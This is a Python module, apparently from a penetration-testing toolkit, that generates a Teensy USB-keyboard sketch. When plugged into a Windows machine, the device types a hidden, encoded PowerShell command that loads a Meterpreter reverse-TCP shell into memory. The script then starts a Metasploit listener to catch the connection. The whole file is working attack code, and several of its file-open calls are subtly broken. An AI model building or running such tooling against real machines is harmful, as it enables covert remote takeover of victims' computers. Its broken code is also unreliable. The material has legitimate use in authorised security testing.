#!/usr/bin/python
# coding=utf-8
import os
import time

import pexpect

import src.core.setcore as core

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass

print("""
The powershell - shellcode injection leverages powershell to send a meterpreter session straight into memory without ever touching disk.

This technique was introduced by Matthew Graeber (http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html)
""")

# define standard metasploit payload
payload = "windows/meterpreter/reverse_tcp"

# create base metasploit payload to pass to powershell.prep
with open(os.path.join(core.setdir, "metasploit.payload"), 'w') as filewrite:
    filewrite.write(payload)

ipaddr = input("Enter the IP for the reverse: ")
port = input("Enter the port for the reverse: ")

shellcode = core.generate_powershell_alphanumeric_payload(payload, ipaddr, port, "")
with open(os.path.join(core.setdir, 'x86.powershell', 'w')) as filewrite:
    filewrite.write(shellcode)

time.sleep(3)
with open(os.path.join(core.setdir, "x86.powershell")) as fileopen:
    pass
    # read in x amount of bytes
    data_read = int(50)

    output_variable = "#define __PROG_TYPES_COMPAT__\n#define PROGMEM\n#include <avr/pgmspace.h>\n"

    counter = 0
    while True:
        reading_encoded = fileopen.read(data_read).rstrip()
        if not reading_encoded:
            break
        output_variable += "const char RevShell_{0}[] PROGMEM = '{1}';\n".format(counter, reading_encoded)
        counter += 1

rev_counter = 0
output_variable += "const char exploit[] PROGMEM = {\n"

while rev_counter != counter:
    output_variable += "RevShell_{0}".format(rev_counter)
    rev_counter += 1
    if rev_counter == counter:
        output_variable += "};\n"
    else:
        output_variable += ",\n"

teensy = output_variable

# write the rest of the teensy code
teensy += ("""
char buffer[55];
int ledPin = 11;

void setup() {
  pinMode(ledPin, OUTPUT);
}
void loop()
{
  BlinkFast(2);
  delay(5000);
  CommandAtRunBar("cmd");
  delay(750);
  Keyboard.print("powershell -nop -window hidden -noni -EncodedCommand ");
  // Write the binary to the notepad file
  int i;
  for (i = 0; i < sizeof(exploit)/sizeof(int); i++) {
    strcpy_P(buffer, (char*)pgm_read_word(&(exploit[i])));
    Keyboard.print(buffer);
    delay(30);
  }
  // ADJUST THIS DELAY IF HEX IS COMING OUT TO FAST!
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  //delay(20000);
  //Keyboard.println("exit");
  delay(9000000);
}
void BlinkFast(int BlinkRate){
  int BlinkCounter=0;
  for(BlinkCounter=0; BlinkCounter!=BlinkRate; BlinkCounter++){
    digitalWrite(ledPin, HIGH);
    delay(80);
    digitalWrite(ledPin, LOW);
    delay(80);
  }
}
void AltF4(){
Keyboard.set_modifier(MODIFIERKEY_ALT);
Keyboard.set_key1(KEY_F4);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
void CtrlS(){
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.set_key1(KEY_S);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
// Taken from IronGeek
void CommandAtRunBar(char *SomeCommand){
  Keyboard.set_modifier(128);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(1500);
  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
void PRES(int KeyCode){
Keyboard.set_key1(KeyCode);
Keyboard.send_now();
Keyboard.set_key1(0);
Keyboard.send_now();
}
void SPRE(int KeyCode){
Keyboard.set_modifier(MODIFIERKEY_SHIFT);
Keyboard.set_key1(KeyCode);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
""")
print("[*] Payload has been extracted. Copying file to {0}".format(os.path.join(core.setdir, "reports/teensy.pde")))
if not os.path.isdir(os.path.join(core.setdir, "reports")):
    os.makedirs(os.path.join(core.setdir, "reports"))
with open(os.path.join(core.setdir, "/reports/teensy.pde", "w")) as filewrite:
    filewrite.write(teensy)
choice = core.yesno_prompt("0", "Do you want to start a listener [yes/no]: ")
if choice == "YES":

    # Open the IPADDR file
    if core.check_options("IPADDR=") != 0:
        ipaddr = core.check_options("IPADDR=")
    else:
        ipaddr = input(core.setprompt(["6"], "IP address to connect back on"))
        core.update_options("IPADDR=" + ipaddr)

    if core.check_options("PORT=") != 0:
        port = core.check_options("PORT=")

    else:
        port = input("Enter the port to connect back on: ")

    with open(os.path.join(core.setdir, "/metasploit.answers", "w")) as filewrite:
        filewrite.write("use multi/handler\n"
                        "set payload {0}\n"
                        "set LHOST {1}\n"
                        "set LPORT {2}\n"
                        "set AutoRunScript post/windows/manage/smart_migrate\n"
                        "exploit -j".format(payload, ipaddr, port))

    print("[*] Launching Metasploit....")
    try:
        child = pexpect.spawn("{0} -r {1}\r\n\r\n".format(os.path.join(core.meta_path(), "msfconsole"),
                                                          os.path.join(core.setdir, "metasploit.answers")))
        child.interact()
    except:
        pass
